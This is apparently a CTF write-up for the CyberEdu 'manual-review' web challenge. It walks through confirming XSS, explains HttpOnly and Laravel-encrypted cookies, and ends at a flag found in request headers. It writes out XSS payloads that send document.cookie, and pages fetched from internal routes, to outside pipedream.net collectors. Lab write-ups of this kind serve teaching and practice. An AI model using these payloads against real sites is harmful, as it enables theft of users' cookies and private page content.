+++
date = '2026-01-12'
draft = false
title = 'CyberEdu manual-review Writeup'
ShowToc = true
tags = ["CyberEdu", "web"]
+++

## Challenge overview

For any coffe machine issue please open a ticket at the IT support department.

Flag format: ctf{sha256}

Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.

---


## Identifying the vulnerabilities

This look familiar?

![challenge-screenshot](xss.png#center) 

Alright, so XSS is confirmed, and we have two types of cookies.

First, the CSRF protection tokens, `XSTF-TOKEN`, then the `manual_review_session`, which actually stores the current session/user. 

I sent a  `<script> fetch('https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=' + encodeURIComponent(document.cookie)); </script>` and look at what we got - 

![challenge-screenshot](cookie.png#center) 

The first request is from my machine, and the second one is from admin. But we need the *manual review* to hijack the admin session. Let me explain why.

Because the `manual_review_session` is sent to us with the `httponly;` attribute, `document.cookie` *cannot* access it. So we literally just can't get them with XSS.

The website cookies have this format after decoding:
```php
{
  "iv": "...",
  "value": "...",
  "mac": "..."
}
```

This is exactly how *Laravel* encrypts cookies. Laravel is a php framework that provies a bunch of stuff, like auth, CSRF protection, session handling and so on. I send some payloads like so:

```php
<script>
fetch('/route')
  .then(r => r.text())
  .then(t =>
    fetch('https://secondlinkwlimitedrequestsbecauseiusedupthefirstone.m.pipedream.net/?data=' +
          encodeURIComponent(t))
  );
</script>
```

`/admin` didn't exist, `/.htpasswd` didn't have access, and we have an imposed `X-RateLimit-Limit: 60`. I ran `gobuster` twice because I didn't learn my lesson the first time, and so I kept getting locked out of the challenge. Incredibly annoying. Anyways, after an hour of waiting I'm back and I printed the admin's `/`. There's something interesting here:

![challenge-screenshot](interesting.png#center) 

And I mean the `http://127.0.0.1:1234/login`. I was snooping around the headers to check what the user-agent was, and what port it was coming from and... 

![challenge-screenshot](flag.png#center) 

I guess that's it!



